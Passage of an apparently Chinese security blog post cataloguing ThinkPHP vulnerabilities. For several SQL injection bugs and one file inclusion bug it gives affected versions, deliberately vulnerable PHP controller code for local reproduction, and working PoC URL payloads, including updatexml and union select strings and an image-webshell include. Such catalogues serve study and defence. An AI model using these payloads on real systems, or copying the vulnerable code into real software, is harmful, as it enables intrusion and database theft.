+<h3 id="Poc-exp-3"><a href="#Poc-exp-3" class="headerlink" title="Poc/exp"></a>Poc/exp</h3><p><code>/index.php?pass[0]=inc&amp;pass[1]=updatexml(2,concat(0x7e,user()),0)&amp;pass[2]=1</code></p>
+<p><img src="https://i.loli.net/2021/05/13/qMTjH8RfC1OFQiL.png"></p>
+<h2 id="ThinkPHP-5-0-15-insert注入"><a href="#ThinkPHP-5-0-15-insert注入" class="headerlink" title="ThinkPHP 5.0.15 insert注入"></a>ThinkPHP 5.0.15 insert注入</h2><h3 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>本次漏洞存在于<code>Builder</code>类的 <code>parseData</code>方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。</p>
+<h3 id="影响版本-8"><a href="#影响版本-8" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>5.0.13&lt;Thinkphp&lt;=5.0.15</code>，<code>5.1.0&lt;=thinkphp&lt;=5.1.5</code></p>
+<h3 id="漏洞分析参考-2"><a href="#漏洞分析参考-2" class="headerlink" title="漏洞分析参考"></a>漏洞分析参考</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/205976.html">https://www.freebuf.com/column/205976.html</a></p>
+<h3 id="漏洞复现（内网环境）-4"><a href="#漏洞复现（内网环境）-4" class="headerlink" title="漏洞复现（内网环境）"></a>漏洞复现（内网环境）</h3><p>在<code>\thinkphp\application\index\controller\Index.php</code>添加以下代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;name/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;user&#x27;</span>)-&gt;insert([<span class="string">&#x27;name&#x27;</span> =&gt; $name]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Poc-exp-4"><a href="#Poc-exp-4" class="headerlink" title="Poc/exp"></a>Poc/exp</h3><p><code>/index/index/index?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1</code></p>
+<p><img src="https://i.loli.net/2021/05/13/kA45KbpIeXYvqri.png"></p>
+<h2 id="ThinkPHP5-select注入"><a href="#ThinkPHP5-select注入" class="headerlink" title="ThinkPHP5 select注入"></a>ThinkPHP5 select注入</h2><h3 id="漏洞介绍-3"><a href="#漏洞介绍-3" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>本次漏洞存在于 <code>Mysql</code> 类的 <code>parseWhereItem</code> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。</p>
+<h3 id="影响版本-9"><a href="#影响版本-9" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>ThinkPHP5</code>全版本</p>
+<h3 id="漏洞分析参考-3"><a href="#漏洞分析参考-3" class="headerlink" title="漏洞分析参考"></a>漏洞分析参考</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/206387.html">https://www.freebuf.com/column/206387.html</a></p>
+<h3 id="漏洞复现（内网环境）-5"><a href="#漏洞复现（内网环境）-5" class="headerlink" title="漏洞复现（内网环境）"></a>漏洞复现（内网环境）</h3><p>在<code>\thinkphp\application\index\controller\Index.php</code>添加以下代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $name = request()-&gt;get(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">        $result = db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;exp&#x27;</span>,$name)-&gt;select();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;select success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Poc-exp-5"><a href="#Poc-exp-5" class="headerlink" title="Poc/exp"></a>Poc/exp</h3><p><code>/index/index/index?name=) union select updatexml(1,concat(0x7,user(),0x7e),1)#</code></p>
+<p><img src="https://i.loli.net/2021/05/13/oisaHlIJw26Q9Xy.png"></p>
+<h2 id="ThinkPHP5-0-10-select注入"><a href="#ThinkPHP5-0-10-select注入" class="headerlink" title="ThinkPHP5.0.10 select注入"></a>ThinkPHP5.0.10 select注入</h2><h3 id="漏洞介绍-4"><a href="#漏洞介绍-4" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>本次漏洞存在于<code> Mysql</code> 类的 <code>parseWhereItem</code> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句。再一个， <code>Request</code> 类的 <code>filterValue</code> 方法漏过滤 <code>NOT LIKE</code> 关键字，最终导致 SQL注入漏洞 的产生。</p>
+<h3 id="影响版本-10"><a href="#影响版本-10" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>ThinkPHP 5.0.10</code></p>
+<h3 id="漏洞分析参考："><a href="#漏洞分析参考：" class="headerlink" title="漏洞分析参考："></a>漏洞分析参考：</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/206599.html">https://www.freebuf.com/column/206599.html</a></p>
+<h3 id="漏洞复现（内网环境）-6"><a href="#漏洞复现（内网环境）-6" class="headerlink" title="漏洞复现（内网环境）"></a>漏洞复现（内网环境）</h3><p>在<code>\thinkphp\application\index\controller\Index.php</code>添加以下代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;name/a&#x27;</span>);</span><br><span class="line">        $result = db(<span class="string">&#x27;user&#x27;</span>)-&gt;where([<span class="string">&#x27;name&#x27;</span> =&gt; $name])-&gt;select();</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Poc-exp-6"><a href="#Poc-exp-6" class="headerlink" title="Poc/exp"></a>Poc/exp</h3><p><code>/index/index/index?name[0]=not like&amp;name[1][0]=%%&amp;name[1][1]=233&amp;name[2]=) union select 1,user()#</code></p>
+<p><img src="https://i.loli.net/2021/05/13/cTosKU7F2LmiXr5.png"></p>
+<h2 id="ThinkPHP-Mysql-聚合函数相关方法注入"><a href="#ThinkPHP-Mysql-聚合函数相关方法注入" class="headerlink" title="ThinkPHP Mysql 聚合函数相关方法注入"></a>ThinkPHP Mysql 聚合函数相关方法注入</h2><h3 id="漏洞介绍-5"><a href="#漏洞介绍-5" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>本次漏洞存在于所有 <code>Mysql</code> 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。</p>
+<h3 id="影响版本-11"><a href="#影响版本-11" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>5.0.0&lt;=ThinkPHP&lt;=5.0.21</code> 、 <code>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</code> 。</p>
+<h3 id="漏洞分析参考：-1"><a href="#漏洞分析参考：-1" class="headerlink" title="漏洞分析参考："></a>漏洞分析参考：</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/206599.html">https://www.freebuf.com/column/206599.html</a></p>
+<h3 id="漏洞复现（内网环境）-7"><a href="#漏洞复现（内网环境）-7" class="headerlink" title="漏洞复现（内网环境）"></a>漏洞复现（内网环境）</h3><p>在<code>\thinkphp\application\index\controller\Index.php</code>添加以下代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = request()-&gt;get(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        $result = db(<span class="string">&#x27;user&#x27;</span>)-&gt;max($options);</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Poc-exp-7"><a href="#Poc-exp-7" class="headerlink" title="Poc/exp"></a>Poc/exp</h3><p>不同版本payload需稍作调整</p>
+<ul>
+<li><p><code>5.0.0~5.0.21</code>、<code> 5.1.3～5.1.10</code><br><code>/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from user%23</code></p>
+</li>
+<li><p><code>5.1.11～5.1.25</code><br><code>/index/index/index?options=id)%2bupdatexml(1,concat(0×7,user(),0x7e),1) from user%23</code></p>
+</li>
+</ul>
+<h2 id="ThinkPHP5文件包含漏洞"><a href="#ThinkPHP5文件包含漏洞" class="headerlink" title="ThinkPHP5文件包含漏洞"></a>ThinkPHP5文件包含漏洞</h2><h3 id="漏洞介绍-6"><a href="#漏洞介绍-6" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>本次漏洞存在于<code>ThinkPHP</code>模板引擎中，在加载模版解析变量时存在变量覆盖问题，而且程序没有对数据进行很好的过滤，最终导致文件包含漏洞的产生。</p>
+<h3 id="影响版本-12"><a href="#影响版本-12" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</code>、<code>5.1.0&lt;=ThinkPHP&lt;=5.1.10</code></p>
+<h3 id="漏洞分析参考-4"><a href="#漏洞分析参考-4" class="headerlink" title="漏洞分析参考"></a>漏洞分析参考</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/207878.html">https://www.freebuf.com/column/207878.html</a></p>
+<h3 id="漏洞复现（内网环境）-8"><a href="#漏洞复现（内网环境）-8" class="headerlink" title="漏洞复现（内网环境）"></a>漏洞复现（内网环境）</h3><p>在<code>\thinkphp\application\index\controller\Index.php</code>添加以下代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建<code>application/index/view/index/index.html</code>文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马<code>1.jpg</code>放至<code>public</code> 目录下（模拟上传图片操作）。</p>
+<h3 id="Poc-exp-8"><a href="#Poc-exp-8" class="headerlink" title="Poc/exp"></a>Poc/exp</h3><p><code>/index.php/index/index/index?cacheFile=1.jpg</code></p>
+
+    </div>
+
+    
+    
+    
+      <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #66ccff;font-size:14px;">-EOF-</div>
+    
+</div>
+      
+      </div>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/WEB/" rel="tag"># WEB</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/09/28/png%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" rel="next" title="PNG文件结构">
+      PNG文件结构 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Thinkphp%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">Thinkphp漏洞整理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-5-0-23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.</span> <span class="nav-text">ThinkPHP 5.0.23远程代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">2.1.1.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.1.2.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.1.3.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E4%BD%8D%E7%BD%AE"><span class="nav-number">2.1.4.</span> <span class="nav-text">漏洞产生位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%96%E6%8E%98%E6%96%B9%E5%BC%8F"><span class="nav-number">2.1.5.</span> <span class="nav-text">挖掘方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">2.2.</span> <span class="nav-text">ThinkPHP 5.0.22远程代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">2.2.3.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%96%E6%8E%98%E6%96%B9%E5%BC%8F-1"><span class="nav-number">2.2.4.</span> <span class="nav-text">挖掘方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-2-2%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">2.3.</span> <span class="nav-text">ThinkPHP 2.2任意代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83-2"><span class="nav-number">2.3.1.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%96%E6%8E%98%E6%96%B9%E5%BC%8F-2"><span class="nav-number">2.3.3.</span> <span class="nav-text">挖掘方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-%E5%89%8D%E5%8F%B0%E7%BC%93%E5%AD%98%E5%86%99shell"><span class="nav-number">2.4.</span> <span class="nav-text">ThinkPHP 前台缓存写shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83-3"><span class="nav-number">2.4.1.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.4.2.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-3"><span class="nav-number">2.4.3.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%96%E6%8E%98%E6%96%B9%E5%BC%8F-3"><span class="nav-number">2.4.4.</span> <span class="nav-text">挖掘方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tp3-2-3"><span class="nav-number">2.4.4.1.</span> <span class="nav-text">tp3.2.3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#onethink1-0"><span class="nav-number">2.4.4.2.</span> <span class="nav-text">onethink1.0</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tp5-0-10"><span class="nav-number">2.4.4.3.</span> <span class="nav-text">tp5.0.10</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-3-2-3-5-1-22-order-by%E6%B3%A8%E5%85%A5"><span class="nav-number">2.5.</span> <span class="nav-text">ThinkPHP 3.2.3&#x2F;5.1.22 order by注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.5.1.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-4"><span class="nav-number">2.5.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83-4"><span class="nav-number">2.5.3.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%EF%BC%89"><span class="nav-number">2.5.4.</span> <span class="nav-text">漏洞复现（内网环境）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Poc-exp"><span class="nav-number">2.5.5.</span> <span class="nav-text">Poc&#x2F;exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Thinkphp3-2-3-find-select-delete%E6%B3%A8%E5%85%A5"><span class="nav-number">2.6.</span> <span class="nav-text">Thinkphp3.2.3 find&#x2F;select&#x2F;delete注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-5"><span class="nav-number">2.6.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%EF%BC%89-1"><span class="nav-number">2.6.2.</span> <span class="nav-text">漏洞复现（内网环境）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Poc-exp-1"><span class="nav-number">2.6.3.</span> <span class="nav-text">Poc&#x2F;exp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#where"><span class="nav-number">2.6.3.1.</span> <span class="nav-text">where:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#alias"><span class="nav-number">2.6.3.2.</span> <span class="nav-text">alias:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#table"><span class="nav-number">2.6.3.3.</span> <span class="nav-text">table</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#where-1"><span class="nav-number">2.6.3.4.</span> <span class="nav-text">where</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#alias-1"><span class="nav-number">2.6.3.5.</span> <span class="nav-text">alias</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#table-1"><span class="nav-number">2.6.3.6.</span> <span class="nav-text">table:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP%E6%A1%86%E6%9E%B63-2-3-update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.7.</span> <span class="nav-text">ThinkPHP框架3.2.3 update注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-6"><span class="nav-number">2.7.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%82%E8%80%83"><span class="nav-number">2.7.2.</span> <span class="nav-text">漏洞分析参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%EF%BC%89-2"><span class="nav-number">2.7.3.</span> <span class="nav-text">漏洞复现（内网环境）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Poc-exp-2"><span class="nav-number">2.7.4.</span> <span class="nav-text">Poc&#x2F;exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-5-1-7-update%E6%B3%A8%E5%85%A5"><span class="nav-number">2.8.</span> <span class="nav-text">ThinkPHP 5.1.7 update注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-1"><span class="nav-number">2.8.1.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-7"><span class="nav-number">2.8.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%82%E8%80%83-1"><span class="nav-number">2.8.3.</span> <span class="nav-text">漏洞分析参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%EF%BC%89-3"><span class="nav-number">2.8.4.</span> <span class="nav-text">漏洞复现（内网环境）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Poc-exp-3"><span class="nav-number">2.8.5.</span> <span class="nav-text">Poc&#x2F;exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-5-0-15-insert%E6%B3%A8%E5%85%A5"><span class="nav-number">2.9.</span> <span class="nav-text">ThinkPHP 5.0.15 insert注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-2"><span class="nav-number">2.9.1.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-8"><span class="nav-number">2.9.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%82%E8%80%83-2"><span class="nav-number">2.9.3.</span> <span class="nav-text">漏洞分析参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%EF%BC%89-4"><span class="nav-number">2.9.4.</span> <span class="nav-text">漏洞复现（内网环境）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Poc-exp-4"><span class="nav-number">2.9.5.</span> <span class="nav-text">Poc&#x2F;exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP5-select%E6%B3%A8%E5%85%A5"><span class="nav-number">2.10.</span> <span class="nav-text">ThinkPHP5 select注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-3"><span class="nav-number">2.10.1.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-9"><span class="nav-number">2.10.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%82%E8%80%83-3"><span class="nav-number">2.10.3.</span> <span class="nav-text">漏洞分析参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%EF%BC%89-5"><span class="nav-number">2.10.4.</span> <span class="nav-text">漏洞复现（内网环境）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Poc-exp-5"><span class="nav-number">2.10.5.</span> <span class="nav-text">Poc&#x2F;exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP5-0-10-select%E6%B3%A8%E5%85%A5"><span class="nav-number">2.11.</span> <span class="nav-text">ThinkPHP5.0.10 select注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-4"><span class="nav-number">2.11.1.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-10"><span class="nav-number">2.11.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%82%E8%80%83%EF%BC%9A"><span class="nav-number">2.11.3.</span> <span class="nav-text">漏洞分析参考：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%EF%BC%89-6"><span class="nav-number">2.11.4.</span> <span class="nav-text">漏洞复现（内网环境）</span></a></li><li class="nav-item nav-level-3"><a 